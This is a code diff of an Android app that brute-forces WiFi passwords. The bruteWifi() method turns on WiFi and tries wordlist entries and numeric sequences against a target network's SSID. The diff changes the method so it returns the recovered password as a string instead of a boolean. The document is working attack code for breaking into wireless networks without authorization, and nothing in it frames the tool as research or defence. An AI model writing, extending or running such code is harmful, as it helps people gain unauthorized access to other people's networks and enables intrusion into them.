@@ -39,9 +39,8 @@ public class MainActivity extends AppCompatActivity {
         @Override
         protected String doInBackground(Void... args) {
             try {
-                bruteWifi();
-            } catch (InterruptedException e) {return null;}
-            return null;
+                return bruteWifi();
+            } catch (InterruptedException e) {return "InterruptedException\r\n";}
         }
 
         @Override
@@ -117,7 +116,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
-        protected boolean bruteWifi() throws InterruptedException {
+        protected String bruteWifi() throws InterruptedException {
             WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
             wifi.setWifiEnabled(true);
 
@@ -147,7 +146,7 @@ public class MainActivity extends AppCompatActivity {
                     while ((line = br.readLine()) != null) {
                         res = connectToUnknownB(wifi, ssid, line.trim(), true);
                         if (res)
-                            return true;
+                            return (line.trim()+"\r\n");
                     }
                 } else {
                     while ((line = br.readLine()) != null) {
@@ -168,7 +167,7 @@ public class MainActivity extends AppCompatActivity {
                         res = connectToUnknownB(wifi, ssid, i, true);
                         if (res) {
                             publishProgress("Password: " + i + "\r\n");
-                            return true;
+                            return i + "\r\n";
                         }
                     }
                 } else {
@@ -176,12 +175,12 @@ public class MainActivity extends AppCompatActivity {
                         res = connectToUnknownB(wifi, ssid, i, true);
                         if (res) {
                             publishProgress("Password: " + i + "\r\n");
-                            return true;
+                            return i + "\r\n";
                         }
                     }
                 }
             }
-            return false;
+            return "pass not wound!\r\n";
         }
 
     };
